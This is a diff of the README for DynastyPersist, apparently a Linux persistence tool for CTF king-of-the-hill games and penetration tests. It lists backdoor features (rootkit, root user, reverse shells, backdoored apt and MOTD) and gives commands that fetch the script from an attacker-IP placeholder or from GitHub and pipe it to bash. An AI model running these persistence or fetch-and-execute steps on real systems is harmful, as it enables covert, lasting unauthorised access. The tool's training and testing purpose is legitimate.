@@ -1,64 +1,63 @@
 
+
 <h1 align="center">DynastyPersist</h1>
 
+<p align="center">
+  DynastyPersist: A streamlined tool for achieving Linux persistence effortlessly.<br>
+  Supports <b><i>KoTH, Battlegrounds and Pentest Operations</i></b><br>
+   <br>
+  <img src="https://img.shields.io/github/license/trevohack/DynastyPersist" alt="GitHub License">
+  <img src="https://img.shields.io/github/stars/trevohack/DynastyPersist" alt="GitHub Stars">
+</p> 
 
-* A CTF Tool for Linux persistence (KOTH, Battlegrounds)
+## Documentation
 
-* A powerful and versatile Linux persistence script designed for various security assessment and testing scenarios. This script provides a collection of features that demonstrate different methods of achieving persistence on a Linux system.
+### [ FEATURES ]
 
-* `There Will Be A Huge Update On This Tool Soon!`
+| Features | Description |
+| :-------- | :-------   | 
+| **SSH Key Generation** |  Automatically generates SSH keys for covert access.  |
+| **Cronjob Persistence** | Sets up cronjobs for scheduled persistence. |
+| **Custom User with Root** | Creates a custom user with root privileges. |
+| **RCE Persistence** | Achieves persistence through remote code execution |
+| **LKM/Rootkit** | Demonstrates Linux Kernel Module (LKM) based rootkit persistence. | 
+| **Bashrc Persistence** | Modifies user-specific shell initialization files for persistence (aliases / reverse shells). |
+| **Systemd Service for Root** | Sets up a systemd service for achieving root persistence. |
+| **LD_PRELOAD Privilege Escalation Config** | Configures LD_PRELOAD for privilege escalation. |
+| **Backdooring Message of the Day / Header** | Backdoors system message display for covert access. |
+| **Modify an Existing Systemd Service** | Manipulates an existing systemd service for persistence. |
+| **Backdoors APT Command** | Backdoors `apt` command to pop up a shell. |
 
-![GitHub](https://img.shields.io/github/license/trevohack/DynastyPersist)
-![GitHub stars](https://img.shields.io/github/stars/trevohack/DynastyPersist)
 
-## Features
+### [ MODES ]
 
-1. **SSH Key Generation:** Automatically generates SSH keys for covert access.
+* Currently, there are 2 modes available in the latest update (1.4).
 
-2. **Cronjob Persistence:** Sets up cronjobs for scheduled persistence.
+* Modes are `normal` and `ctf` which are designed to work in a specific behaviour.
 
-3. **Custom User with Root:** Creates a custom user with root privileges.
+* Firstly, `normal` mode enters the tool in the usual setup, with all features. Theses features will run locally on the local host where the script is being executed. Desgined for persistence in real-time operations.
 
-4. **RCE Persistence:** Achieves persistence through remote code execution (php webshell).
+* Secondly, `ctf` (beta) mode is an extra feature to login to a compromised server via SSH and gain persistence. This addon will help a lot in KoTH or Battlegrounds. Further, this will save a lot of time taken for setting up persistence. 
 
-5. **LKM/Rootkit:** Demonstrates Linux Kernel Module (LKM) based rootkit persistence.
+### [ USAGE ] 
 
-6. **Bashrc Persistence:** Modifies user-specific shell initialization files for persistence (aliases / reverse shells). 
+* The syntax to use the tool is described below: 
 
-7. **Systemd Service for Root:** Sets up a systemd service for achieving root persistence.
-
-8. **LD_PRELOAD Privilege Escalation Config:** Configures LD_PRELOAD for privilege escalation.
-
-9. **Backdooring Message of the Day / Header:** Backdoors system message display for covert access.
-
-10. **Modify an Existing Systemd Service:** Manipulates an existing systemd service for persistence.
-
-11. **Backdoors APT Command:** Backdoors `apt` command to pop up a shell. 
-
+```bash
+$ ./dynasty.sh <lhost> <lport> <mode> 
+$ ./dynasty.sh 10.10.14.3 9999 ctf 
+$ ./dynasty.sh 10.10.14.3 9999 normal
+``` 
 
 ## Installation
 
-1. Clone this repository to your local machine:
-
+Via Git
 ```bash
-$ git clone https://github.com/Trevohack/DynastyPersist.git
-
-$ python3 -m http.server 8080 
-root@tyler.thm~$ cd /opt && wget -c [ATTACKER-IP]:8080/DynastyPersist && cd DynastyPersist && chmod +x dynasty.sh && ./dynasty.sh <ATTACKER_IP> <PORT>
+$ git clone https://github.com/Trevohack/DynastyPersist
+$ cd DynastyPersist/src 
 ``` 
 
-2. One linear
-   
+Via Curl 
 ```bash
-curl -sSL [ATTACKER_IP]:8080/DynastyPersist/dynasty.sh <ATTACKER_IP> <PORT> | bash
+$ curl -sSL https://raw.githubusercontent.com/Trevohack/DynastyPersist/main/src/dynasty.sh | bash
 ``` 
-
-## Support
-
-For support, email `spaceshuttle.io.all@gmail.com` or join our Discord server. 
-
-* Discord: `https://discord.gg/WYzu65Hp`
-
-Thank You! 
-
-![icons8-linux](https://github.com/Trevohack/DynastyPersist/assets/136177431/61035f94-039b-4ed9-b463-36a78aa69ab0)
